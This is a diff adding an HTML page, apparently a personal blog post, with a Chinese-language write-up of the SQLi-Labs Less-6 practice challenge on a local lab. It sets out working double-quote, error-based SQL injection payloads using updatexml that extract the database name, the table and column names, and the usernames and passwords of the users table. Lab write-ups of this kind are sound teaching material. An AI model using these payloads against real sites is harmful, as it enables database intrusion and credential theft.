@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-6 双引号报错注入 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-6 双引号报错注入 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.23 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, MySQL, 报错注入</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入</li>
+        <li><strong>题目名称：</strong>Less-6 (GET - Double Query - Double Quotes - String)</li>
+        <li><strong>提示：</strong>GET请求，双注入（报错注入），双引号闭合</li>
+    </ul>
+
+    <h2>2. 解题思路与前置原理</h2>
+    <p>本关卡属于无回显环境（仅显示 "You are in........"），且上下文闭合符号由单引号变更为双引号。在双引号包裹的环境下，输入单引号会被当作普通字符串处理，不会破坏 SQL 语法；必须使用双引号 <code>"</code> 才能完成上下文逃逸。</p>
+    <p>由于无数据回显，常规的 <code>UNION SELECT</code> 联合查询无法将数据打印到前端，因此必须使用 <strong>报错注入（Error-based Injection）</strong>。通过 <code>updatexml()</code> 函数故意构造非法的 XPath 参数（如包含波浪号 <code>~</code>），迫使数据库在抛出错误时，将目标数据原样拼接到报错信息中。</p>
+
+    <h2>3. 操作步骤与解析</h2>
+    
+    <p><strong>第一步：探测注入点与确认闭合方式</strong></p>
+    <p><strong>输入 URL：</strong><code>http://localhost/sqli-labs-master/Less-6/?id=1"</code></p>
+    <p><strong>回显现象：</strong>页面抛出 SQL 语法错误：<code>near '"1"" LIMIT 0,1'</code>。</p>
+    <p><strong>解释与原理：</strong>观察报错信息。输入单引号 <code>?id=1'</code> 时页面正常，输入双引号 <code>"</code> 时报错，确认后端代码结构为 <code>id = "$id"</code>。</p>
+
+    <p><strong>第二步：利用 updatexml 爆出数据库名</strong></p>
+    <p><strong>输入 URL：</strong><code>http://localhost/sqli-labs-master/Less-6/?id=1" AND updatexml(1, concat(0x7e, (select database()), 0x7e), 1) --+</code></p>
+    <p><strong>回显现象：</strong>页面报错：<code>XPATH syntax error: '~security~'</code>。</p>
+    <p><strong>解释与原理：</strong>使用双引号完成闭合后，利用 <code>updatexml</code> 报错机制。通过 <code>concat</code> 将 <code>0x7e</code>（波浪号）与当前库名拼接，强制触发报错并回显 <code>security</code>。</p>
+
+    <p><strong>第三步：利用 updatexml 爆出表名</strong></p>
+    <p><strong>输入 URL：</strong><code>http://localhost/sqli-labs-master/Less-6/?id=1" AND updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='security'), 0x7e), 1) --+</code></p>
+    <p><strong>回显现象：</strong>页面报错：<code>XPATH syntax error: '~emails,referrers,uagents,users~'</code>。</p>
+
+    <p><strong>第四步：利用 updatexml 爆出列名</strong></p>
+    <p><strong>输入 URL：</strong><code>http://localhost/sqli-labs-master/Less-6/?id=1" AND updatexml(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'), 0x7e), 1) --+</code></p>
+    <p><strong>回显现象：</strong>页面报错：<code>XPATH syntax error: '~id,username,password~'</code>。</p>
+
+    <p><strong>第五步：提取最终数据（触发截断）</strong></p>
+    <p><strong>输入 URL：</strong><code>http://localhost/sqli-labs-master/Less-6/?id=1" AND updatexml(1, concat(0x7e, (select group_concat(username, 0x3a, password) from security.users), 0x7e), 1) --+</code></p>
+    <p><strong>回显现象：</strong>页面报错：<code>XPATH syntax error: '~Dumb:Dumb,Angelina:I-kill-you,D'</code>。</p>
+    <p><strong>解释与原理：</strong><code>0x3a</code> 为冒号，用于格式化输出。由于 MySQL <code>updatexml</code> 报错机制存在 32 字符的物理截断限制，数据未能完整显示。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>地址栏回滚现象：</strong>在执行 Payload 并按下回车后，浏览器地址栏会自动重置为 <code>?id=1</code>。此现象并非 Payload 发送失败，而是由于浏览器对包含大量特殊字符（如双引号、空格）的 URL 解析机制，或后端处理后的重定向（302）导致。判断注入是否成功的唯一标准是页面回显内容（如 XPATH 报错信息），而非地址栏的变化。</li>
+        <li><strong>上下文闭合机制：</strong>在双引号包裹的环境中，单引号不具备破坏语法的能力，会被当作普通字符。必须严格匹配当前上下文对应的闭合符号（双引号）。</li>
+        <li><strong>数据截断限制：</strong>报错注入天然存在长度限制。在实战（如 HVV）中，若需提取大量数据，需结合 <code>substr()</code> 函数进行分段截取，或编写自动化脚本进行循环提取。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>双引号报错注入：</strong>原理与单引号报错注入一致，核心在于利用 <code>updatexml</code> 或 <code>extractvalue</code> 等函数，将数据夹带在错误信息中输出。</li>
+        <li><strong>信息收集思路：</strong>通过报错信息中的 <code>near</code> 提示，反推后端 SQL 语句的闭合方式，是应对所有未知注入点的通用起手式。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
